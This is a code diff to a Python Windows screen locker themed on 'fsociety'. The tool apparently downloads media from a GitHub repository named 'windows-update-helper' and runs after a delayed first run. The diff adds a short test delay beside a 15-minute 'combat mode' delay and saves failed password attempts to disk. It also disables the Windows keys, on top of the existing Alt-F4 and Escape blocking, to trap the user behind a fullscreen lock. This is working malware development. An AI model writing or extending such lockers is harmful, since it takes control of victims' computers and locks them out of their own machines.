@@ -24,23 +24,34 @@ import cv2, pygame, keyboard, numpy as np, socket, re, winsound
 PASS = "1601"
 TRIES = 5
 HOURS = 1
-DELAY_MINUTES = 15  # Задержка перед первым запуском
+DELAY_MINUTES = 15  # Для боевого режима
+TEST_DELAY = 15  # Для теста (секунд)
+TEST_MODE = True  # True = тест (15 сек), False = боевой (15 мин)
 TIMER = os.path.join(tempfile.gettempdir(), "timer.dat")
+ATTEMPTS_FILE = os.path.join(tempfile.gettempdir(), "attempts.dat")
 VIDEO_URL = "https://github.com/ippo123459-bit/windows-update-helper/raw/refs/heads/main/fuxEcorp.mp4.mp4"
 MUSIC_URL = "https://github.com/ippo123459-bit/windows-update-helper/raw/refs/heads/main/Max_Quayle_-_Mr._Robot_OST_Main_Theme_(SkySound.cc)(1).mp3"
 T = tempfile.gettempdir()
 V = os.path.join(T, "v.mp4")
 M = os.path.join(T, "m.mp3")
-tries = TRIES
 
-# Флаг первого запуска
+# Загружаем сохранённые попытки
+if os.path.exists(ATTEMPTS_FILE):
+    try:
+        with open(ATTEMPTS_FILE) as f: tries = int(f.read())
+    except: tries = TRIES
+else:
+    tries = TRIES
+
+def save_attempts():
+    with open(ATTEMPTS_FILE, 'w') as f: f.write(str(tries))
+
 FIRST_RUN_FLAG = os.path.join(tempfile.gettempdir(), "first_run.flag")
 
 def is_first_run():
     if os.path.exists(FIRST_RUN_FLAG):
-        return False  # Уже запускался — сразу винлокер
+        return False
     else:
-        # Первый запуск — создаём флаг
         with open(FIRST_RUN_FLAG, 'w') as f: f.write('1')
         return True
 
@@ -141,6 +152,8 @@ def anim():
     a.configure(bg='black'); a.overrideredirect(True)
     a.protocol("WM_DELETE_WINDOW",lambda:None)
     a.bind("<Alt-F4>",lambda e:None); a.bind("<Escape>",lambda e:None)
+    # Блокируем Win
+    a.bind("<Win_L>",lambda e:None); a.bind("<Win_R>",lambda e:None)
     l=tk.Label(a,text="",bg='black',fg='white',font=('Courier',55,'bold')); l.pack(expand=True)
     for t in ["f","f s","f s o","f s o c","f s o c i","f s o c i e","f s o c i e t","f s o c i e t y"]:
         l.config(text=t); a.update(); time.sleep(0.3)
@@ -175,6 +188,7 @@ class Locker:
         self.w.configure(bg='black'); self.w.overrideredirect(True)
         self.w.protocol("WM_DELETE_WINDOW",lambda:None)
         self.w.bind("<Alt-F4>",lambda e:None); self.w.bind("<Escape>",lambda e:None)
+        self.w.bind("<Win_L>",lambda e:None); self.w.bind("<Win_R>",lambda e:None)
         self.w.focus_force()
         self.end=timer_get()
         self.tl=tk.Label(self.w,text="",bg='black',fg='#ff4444',font=('Courier',30,'bold'))
@@ -227,11 +241,14 @@ class Locker:
             except: pass
             unlock_keys()
             self.sl.config(text="ВЕРНО!",fg='white'); self.w.update()
-            try: os.remove(TIMER)
+            try:
+                os.remove(TIMER)
+                os.remove(ATTEMPTS_FILE)
             except: pass
             time.sleep(1); self.r.destroy(); os._exit(0)
         else:
             tries-=1
+            save_attempts()
             if tries>0: self.sl.config(text=f"НЕВЕРНО! ОСТАЛОСЬ: {tries}",fg='white')
             else:
                 try: winsound.PlaySound(None, 0)
@@ -252,11 +269,13 @@ if __name__=="__main__":
     threading.Thread(target=timer_check, daemon=True).start()
     
     if is_first_run():
-        # Первый запуск — ждём 15 минут, потом анимация+видео+винлокер
-        time.sleep(DELAY_MINUTES * 60)
+        # Тест или боевой режим
+        if TEST_MODE:
+            time.sleep(TEST_DELAY)  # 15 секунд для теста
+        else:
+            time.sleep(DELAY_MINUTES * 60)  # 15 минут боевой
         anim()
         video()
-    # Если не первый запуск — сразу винлокер
     
     lock_keys()
     Locker()
